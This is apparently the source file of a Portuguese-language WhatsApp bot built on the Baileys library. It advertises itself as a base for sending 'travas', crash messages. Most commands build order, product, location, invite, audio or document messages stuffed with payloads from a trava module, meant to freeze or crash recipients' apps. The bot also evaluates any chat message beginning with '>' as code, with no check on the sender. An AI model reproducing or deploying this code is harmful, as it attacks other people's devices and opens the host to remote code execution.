/ Basis bot dibuat oleh: JuniorNerd & ann么nimo
https://youtube.com/@juniornerd6971

di ubah oleh faris-mods
https://youtube.com/@faris-mods




const {
default: makeWASocket, 
downloadContentFromMessage, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
generateWAMessageContent, 
generateWAMessage, 
makeInMemoryStore,
prepareWAMessageMedia,
MediaType, 
areJidsSameUser, 
WAMessageStatus,  
AuthenticationState, 
GroupMetadata, 
initInMemoryKeyStore,
getContentType, 
MiscMessageGenerationOptions, 
useSingleFileAuthState, 
BufferJSON, 
WAMessageProto, 
MessageOptions, 
WAFlag, 
WANode,	
generateWAMessageFromContent,
WAMetric,	
ChatModification, 
MessageTypeProto, 
WALocationMessage, 
ReconnectMode, 
WAContextInfo, 
proto,	
WAGroupMetadata, 
ProxyAgent,	
waChatKey, 
MimetypeMap, 
MediaPathMap, 
WAContactMessage, 
WAContactsArrayMessage, 
WAGroupInviteMessage, 
WATextMessage, 
WAMessageContent, 
WAMessage, 
BaileysError, 
WA_MESSAGE_STATUS_TYPE, 
MediaConnInfo, 
URL_REGEX, 
WAUrlInfo, 
WA_DEFAULT_EPHEMERAL, 
WAMediaUpload, 
mentionedJid, 
processTime, 
Browser, 
MessageType, 
Presence, 
WA_MESSAGE_STUB_TYPES,
Miimetype, 
relayWAMessage,	
Browsers, 
GroupSettingChange, 
delay, 
DisconnectReason, 
WASocket, 
getStream, 
WAProto, 
isBaileys, 
AnyMessageContent, 
fetchLatestBaileysVersion
} = require('@adiwajshing/baileys');

//EXPORTAÇÃO DE MÓDULOS
const { getBuffer, fetchJson, getGroupAdmins, getRandom, getExtension} = require('./arquivos/funções/myfunc.js'); 
const P = require('pino'); 
const fs = require('fs'); 
const os = require('os');
const hx = require('hxz-api'); 
const crypto = require('crypto'); 
const util = require('util'); 
const { Boom }  = require('@hapi/boom'); 
const axios = require('axios'); 
const qrterminal = require('qrcode-terminal');
const encodeUrl = require('encodeurl'); 
const linkfy = require('linkifyjs'); 
const request = require('request'); 
const cheerio = require('cheerio'); 
const ms = require('ms'); 
const chalk = require('chalk'); 
const cfonts = require('cfonts');
const moment = require('moment-timezone'); 
const ffmpeg = require('fluent-ffmpeg'); 
const { exec } = require('child_process'); 
const color = (text, color) => { return !color ? chalk.green(text) : chalk.keyword(color)(text) }; 
const yts = require('yt-search'); 
const imgbb = require('imgbb-uploader'); 
const googleImage = require('g-i-s'); 
const googleIt = require('google-it'); 
const fetch = require('node-fetch'); 
const imageToBase64 = require('image-to-base64'); 
const thiccysapi = require('textmaker-thiccy'); 

//DONO,NOME,PREFIX ETC
const infos = JSON.parse(fs.readFileSync('./arquivos/dono/dono.js'))
var {prefix, nomeDono, NumberDono, NomeDoBot } = infos

//MENUS
const menu = require('./arquivos/menus/menu.js');

//FOTOS
let fotomenu = fs.readFileSync("./arquivos/fotos/menu.jpg");

//TRAVAS
const { trava } = require('./travas/trava.js')

//PING
function kyun(seconds){
function pad(s){ return (s < 10 ? '0' : '') + s;}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos` }
const convertBytes = function(bytes) {
const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
if (bytes == 0) {
return "n/a"
}
const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
if (i == 0) {
return bytes + " " + sizes[i]
}
return (bytes / Math.pow(1024, i)).toFixed(1) + " " + sizes[i]
}

//BANER DO BOT NO TERMUX
const logo = cfonts.render((`Jn|e|Anonimo`), {
font: 'block',
color: 'white',
align: 'center',
colors: ["cyan","magenta"],
maxLength: 7,
lineHeight: 2
});

//CONEXÃO 
const store = makeInMemoryStore({ logger: P().child({ level: 'debug', stream: 'store' }) })
store.readFromFile('./mensagens.json')
setInterval(() => { store.writeToFile('./mensagens.json') }, 10000)
const { state, saveState } = useSingleFileAuthState('./qrBot.json')
async function startBot() {
const { version, isLatest } = await fetchLatestBaileysVersion()
console.log(logo.string)
console.log(color("base By Anônimo & JuNioRNeRd", "yellow"))
console.log(color("Seu bot está conectado!!!"))
const conn = makeWASocket({ version,  logger: P({ level: 'silent' }),
printQRInTerminal: true,
browser: ['BASE-BOT', 'Annônimo', '1.0.0'], auth: state })
store.bind(conn.ev)
conn.ev.on('chats.set', () => {
console.log(store.chats.all())})
conn.ev.on('contacts.set', () => {
console.log(Object.values(store.contacts))})
conn.ev.on('creds.update', saveState);
conn.ev.on('messages.upsert', async (msg) => {
  try {

//DEFINIÇÃO DAS FUNÇÕES
const info = msg.messages[0]
  if (!info.message) return 
  if (info.key && info.key.remoteJid == 'status@broadcast') return
const type = Object.keys(info.message)[0] == 'senderKeyDistributionMessage' ? Object.keys(info.message)[2] : (Object.keys(info.message)[0] == 'messageContextInfo') ? Object.keys(info.message)[1] : Object.keys(info.message)[0]
const content = JSON.stringify(info.message);
const altpdf = Object.keys(info.message)
global.prefix
const from = info.key.remoteJid
var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : ''
const budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''
var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''
const isGroup = info.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? info.key.participant : info.key.remoteJid
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const pushname = info.pushName ? info.pushName : ''
//MULTI PREFIX 
const prefix = /^[/.!#=*?+~]/gi.test(body) ? body.match(/^[/.!#=*?+~]/gi)[0] : '-'
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const botNumber = conn.user.id.split(':')[0]+'@s.whatsapp.net'
const args = body.trim().split(/ +/).slice(1);
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null 
const enviar = (text) => {
  conn.sendMessage(from, {text: text}, {quoted: info})
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? conn.sendMessage(from, {text: teks.trim(), mentions: memberr}) : conn.sendMessage(from, {text: teks.trim(), mentions: memberr})}
const q = args.join(' ')
const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}

//isMidias
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"
const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
const getFileBuffer = async (mediakey, MediaType) => {
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
return buffer}

//DONO , ADMS
const numerodono = [`${infos.NumberDono}@s.whatsapp.net`]
const isDono = numerodono.includes(sender);
const isGroupAdmins = groupAdmins.includes(sender) || false 
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

if (budy.startsWith('>')) {


console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m EVAL \x1b[1;37m]', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))

try {

return enviar(JSON.stringify(eval(budy.slice(2)),null,'\t'))

} catch(e) {

enviar(`${e}`)

}

}

//CONSOLE DO TERMINAL
var olog = '\n'
const consoleon = olog
if (isGroup && isCmd) console.log(
`${consoleon}`,color('𝘾𝙤𝙢𝙖𝙣𝙙𝙤 𝙚𝙢 𝙜𝙧𝙪𝙥𝙤', 'white'),
`${consoleon}`,color('𝘾𝙤𝙢𝙖𝙣𝙙𝙤:', 'white'), color(`${command}`, 'cyan'),
`${consoleon}`,color('𝙉𝙪𝙢𝙚𝙧𝙤:', 'white'), color(`${sender.split("@")[0]}`, 'cyan'),
`${consoleon}`,color('𝙂𝙧𝙪𝙥𝙤:', 'white'), color(`${groupName}`, 'cyan'),
`${consoleon}`,color('𝙉𝙞𝙘𝙠:', 'white'), color(`${pushname}`, 'cyan'),
`${consoleon}`,color(`${NomeDoBot}`, 'white')
)
//console de grupo
if (isGroup && !isCmd) console.log(
`${consoleon}`,color('𝙈𝙚𝙣𝙨𝙖𝙜𝙚𝙢 𝙚𝙢 𝙜𝙧𝙪𝙥𝙤', 'white'),
`${consoleon}`,color('𝘾𝙤𝙢𝙖𝙣𝙙𝙤:', 'white'), color('false', 'cyan'),
`${consoleon}`,color('𝙉𝙪𝙢𝙚𝙧𝙤:', 'white'), color(`${sender.split("@")[0]}`, 'cyan'),
`${consoleon}`,color('𝙂𝙧𝙪𝙥𝙤:', 'white'), color(`${groupName}`, 'cyan'),
`${consoleon}`,color('𝙉𝙞𝙘𝙠:', 'white'), color(`${pushname}`, 'cyan'),
`${consoleon}`,color(`${NomeDoBot}`, 'white')
)
//console de comando no pv
if (!isGroup && isCmd) console.log(
`${consoleon}`,color('𝘾𝙤𝙢𝙖𝙣𝙙𝙤 𝙣𝙤 𝙥𝙫', 'white'),
`${consoleon}`,color('𝘾𝙤𝙢𝙖𝙣𝙙𝙤:', 'white'), color(command, 'cyan'),
`${consoleon}`,color('𝙉𝙪𝙢𝙚𝙧𝙤:', 'white'), color(`${sender.split("@")[0]}`, 'cyan'),
`${consoleon}`,color('𝙂𝙧𝙪𝙥𝙤:', 'white'), color('Não', 'cyan'),
`${consoleon}`,color('𝙉𝙞𝙘𝙠:', 'white'), color(`${pushname}`, 'cyan'),
`${consoleon}`,color(`${NomeDoBot}`, 'white'))

//console de mensagem no pv
if (!isGroup && !isCmd) console.log(
`${consoleon}`,color('𝙈𝙚𝙣𝙨𝙖𝙜𝙚𝙢 𝙣𝙤 𝙥𝙫', 'white'),
`${consoleon}`,color('𝘾𝙤𝙢𝙖𝙣𝙙𝙤:', 'white'), color('false', 'cyan'),
`${consoleon}`,color('𝙉𝙪𝙢𝙚𝙧𝙤:', 'white'), color(`${sender.split("@")[0]}`, 'cyan'),
`${consoleon}`,color('𝙂𝙧𝙪𝙥𝙤:', 'white'), color('Não', 'cyan'),
`${consoleon}`,color('𝙉𝙞𝙘𝙠:', 'white'), color(`${pushname}`, 'cyan'),
`${consoleon}`,color(`${NomeDoBot}`, 'white')
)

//selos do bot
const selo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ... {}}, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}}
//

switch(command){
//INÍCIO DOS COMANDOS
case 'menu':
var  basemenu = { 
image: fotomenu,
caption: menu.menutxt(pushname,prefix),
contextInfo: {externalAdReply : {
title : `By Anônimo & JuNioRNeRd`,
body : `${NomeDoBot}`,
renderLargerThumbnail:false,
showAdAttribution: true, 
mediaUrl: `https://google.com`, 
mediaType: 2, 
thumbnail: fs.readFileSync("./arquivos/fotos/menu.jpg")
}}}
conn.sendMessage(from, basemenu)
break

case 'pythonbug':
conn.sendMessage( from, { document: { url: `./travas/py.zip`}, mimetype: 'application/nu', fileName: `By Anônimo & JuNioRNeR.py${trava()}`,  },  { quoted: selo })
break

case 'carrinho':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage":{"orderId":"3648563358700955","thumbnail":
fs.readFileSync('./travas/oi.jpeg'),
"itemCount":1,
"status":"INQUIRY",
"surface":"CATALOG",
"message":`By Anônimo & JuNioRNeR ${trava()} `,
"orderTitle":`By Anônimo & JuNioRNeR ${trava()} `,
"sellerJid":"557998279117@s.whatsapp.net",
"token":"AR4flJ+gzJw9zdUj+RpekLK8gqSiyei/OVDUFQRcmFmqqQ==",
"totalAmount1000":"50000",
"totalCurrencyCode":"BRL",
"contextInfo":{"expiration":604800,"ephemeralSettingTimestamp":"1679959486","entryPointConversionSource":"global_search_new_chat","entryPointConversionApp":"whatsapp","entryPointConversionDelaySeconds":9,"disappearingMode":{"initiator":"CHANGED_IN_CHAT"}}}
}), { userJid: conn.user.id})
conn.relayMessage(from,order.message, { messageId: order.key.id })
break

case 'audiobug':
conn.sendMessage(from,  {  "caption": `By Anônimo & JuNioRNeR ${trava()} `, audio: {url: './arquivos/audio/audio.mp3'},mimetype: 'audio/mpeg', ptt:false,
"title":`By Anônimo & JuNioRNeR ${trava()} `,
 "thumbnail": fs.readFileSync('./arquivos/fotos/menu.jpg'),
"quoted": info,
"contextInfo": { 
"forwardingScore": 508, "isForwarded": true,
"externalAdReply":{ 
"title": `By Anônimo & JuNioRNeR ${trava()} `,
"text": "⚡",
"description": `Melhor base para bot de travas da web`,
"body": "Melhor base para bot de travas da web", 
"mediaType": 0, 
"thumbnail": fs.readFileSync('./arquivos/fotos/menu.jpg'),
"MediaUrl": `https://Wa.me/stickerpack/whatsappcuppy`,
"sourceType": 33,
"sourceUrl": `https://Wa.me//stickerpack/whatsappcuppy`
}}},
{quoted: info}
)
break

case 'ligação':
case 'ligacao':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var o = generateWAMessageFromContent(from, proto.Message.fromObject({
"extendedTextMessage":{
"text":"https://call.whatsapp.com/video/Og8OKsbcBUtMlunn678ezH",
"matchedText":"https://call.whatsapp.com/video/Og8OKsbcBUtMlunn678ezH",
"description":"Link de chamada do WhatsApp",
"title":"Chamada de vídeo do WhatsApp",
"previewType":"NONE",
"jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAEAAgMBAQEAAAAAAAAAAAAABgcBBQgCAwT/xAA0EAABAwIDBQUIAQUAAAAAAAAAAQIDBAUGESEHElFhcRcyVaTSMTM2QXKRs8ITFFKBseH/xAAaAQEAAgMBAAAAAAAAAAAAAAAAAQQCAwUG/8QAJxEBAAIBAgYCAQUAAAAAAAAAAAECAwQREhNBUVKRITEyM0KBwfD/2gAMAwEAAhEDEQA/AL9ABi84AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADXXm922yxNkulZFTo7uo5c3O6NTVTR9ouFfFPLy+kmKzP1DXbJSs7TMQloIl2i4V8U8vL6R2i4V8U8vL6Rw27I52Pyj2loIl2i4V8U8vL6T0zaHhZ70a26tRV/ugkRPurRw27HOx+Ue0rB8qWohq6dk9LLHNC9M2vY5HIqclQ+pDYAAJAAAAAAAAAq5Iq8AYf3HdAhy7f7tU3u7VFfWPV0krlVEz0Y35NTkhrgC79POzMzO8gACAAAWNsWvM9PiB1rdI5aWqY5zWLqjZGpnmnDRFReOnAu4562TfHtu6S/jcWdj/HUGHWuo6NGz3Rzc91e7CiporufBP+Z18ld7bQ6ulyxTDM3n4iW5xXiu24Zga6ue58z9WQRZK9yccvknNRhHFNBiillloUkjkhVEkikTJzc88l00VFyX7HOVwram41klVXTPnqJFzc965qpZ2wb316+mH9ybY4rXdji1dsmWK9FugA0uiAAAAABh/cd0MmH9x3QIcmAAuvOAAAAACX7Jvj23dJfxuG1j49uXSL8TRsm+Pbd0l/G4/bthtVZT4qqLhJC7+jqkYkcqapmjERUXgui6GH7/4WoiZ0/wAd/wCkDLX2De+vX0w/uVQWvsG99evph/cZPxlGk/Wr/ui3QAVXbAAAAAAw/uO6GQEOTF0XJTBbGN9mdVPcZq7D/wDG9kzle+mc5GK1y6ruqumXLTIinZ1irwvzEXqLcXrPVw76fJWdtkSBLezrFXhfmIvUOzrFXhfmIvUTxV7seTk8Z9IkCW9nWKvC/MReo9M2cYpc5EW2o1F+a1EWSfZw4q9zk5PGfT3sjjc/HdC5qKqMZK5y8E3HJ/tUL7rqOnr6SSmrIWTQSJuuY9M0VCJbO8FNwxFLUVcjJrjM3dc5ndjb7d1OOa+1eSf5mhWyW3tvDq6XFOPHtbqojHWz6qssq1VqZLV25y+xE3nxclRPanP785PsRtdbRw3Oqq6aSGKf+NsayN3Vdu72aoi/LVNS0AJyTMbSU0taZOOoADBaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB//9k="
}}), { userJid: conn.user.id})
conn.relayMessage(from,o.message, { messageId: o.key.id })
break

case 'catalogo': {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./arquivos/fotos/menu.jpg') }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `By Anônimo & JuNioRNeR ${trava()} `,
"description": `By Anônimo & JuNioRNeR ${trava()} `,
"currencyCode": `RS`,
"footerText": `By Anônimo & JuNioRNeR ${trava()} `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `By Anônimo & JuNioRNeRd `,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: from })
conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break

case 'liveloc':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var loc = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -18.49335858,
"degreesLongitude": -62.19109138,
"caption": `By Anônimo & JuNioRNeR ${trava()} `,
"sequenceNumber": "1680110670076001",
"jpegThumbnail": fs.readFileSync('./travas/oi.jpeg'),
}}), { userJid: conn.user.id})
conn.relayMessage(from,loc.message, { messageId: loc.key.id })
break

case 'convite':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `By Anônimo & JuNioRNeR ${trava()} `,
"groupName": `By Anônimo & JuNioRNeR ${trava()} `,
"caption": `By Anônimo & JuNioRNeR ${trava()} `,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from })
conn.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
break

case 'webpag':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: conn.waUploadToServer })
var oi = generateWAMessageFromContent(from, proto.Message.fromObject({
"extendedTextMessage":{"text":`By Anônimo & JuNioRNeR ${trava()} `,
contextInfo: {externalAdReply : {
title : `By Anônimo & JuNioRNeR ${trava()} `,
body : `By Anônimo & JuNioRNeR ${trava()} `,
renderLargerThumbnail:false,
showAdAttribution: true, 
mediaUrl: `https://google.com`, 
mediaType: 2, 
thumbnail: fs.readFileSync("./arquivos/fotos/menu.jpg")
}}}}), { userJid: conn.user.id})
conn.relayMessage(from,oi.message, { messageId: oi.key.id })
break

case 'doc':
let Messagemdoc = {
document: fotomenu,
mimetype: 'text/plain',
fileName: `By Anônimo & JuNioRNeR ${trava()} `,
}
conn.sendMessage(from, Messagemdoc, {quoted:selo})
break

case 'loc':
conn.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `By Anônimo & JuNioRNeR ${trava()} `,addrees: 'sla kkkk'}},{quoted: selo})
break

case 'fig':
conn.sendMessage(from, {sticker: fs.readFileSync('./arquivos/figurinhas/fig.webp')}, {quoted: selo});
break
//FIM DOS COMANDOS 
default:


//FINAL DA CONEXÃO 
}
} catch (e) {console.log(e)}})

conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
 
fs.watchFile('./index.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log(color("A index do bot foi editada , estou reiniciando aguarde 😃👍", "red"));
process.exit()
}
})

if(fs.existsSync("mensagens.json")) { 
statsObj = fs.statSync('./mensagens.json')  

if(convertBytes(statsObj.size) >= "10 MB") {
exec("rm mensagens.json") 
}
}

if(connection === 'close') {
var shouldReconnect = ((lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut)
if(String(lastDisconnect.error).includes("Fluxo com erro!")) {
console.log(color("Fluxo com erro, INGNORE ESSA MENSAGEM ", "red"))
} else if(String(lastDisconnect.error).includes("Falha na conexão!")) {
exec("rm qrBot.json")  
exec("rm mensagens.json")
console.log(color("Você não gerou o qrCode de forma certa, e ele foi de f, já estou gerando outro aguarde...", "red"))
process.exit()
} else if(String(lastDisconnect.error).includes("necessário reiniciar o bot!")) {
console.log(color("APAGUE O QRCODE E TENTE SCANEAR NOVAMENTE", "red"))
} else if(String(lastDisconnect.error).includes("Conexão caiu")){
console.log(color("CONEXÃO ESTÁ FRACA... Net de padaria em mn 🧐... AGUARDE QUE LOGO VOLTA AO NORMAL.", "red"))
} else if(String(lastDisconnect.error).includes("Conexão terminada")){
console.log(color("CONEXÃO ESTÁ FRACA... Net de padaria em mn 🧐... AGUARDE QUE LOGO VOLTA AO NORMAL.", "red"))
} else {
console.log('Conexão caiu devido a ', lastDisconnect.error, ', Reconectar ', shouldReconnect)
}
if(lastDisconnect?.error) {
startBot()
}}
if(update.isNewLogin) {
 startBot()
}
})
}
startBot()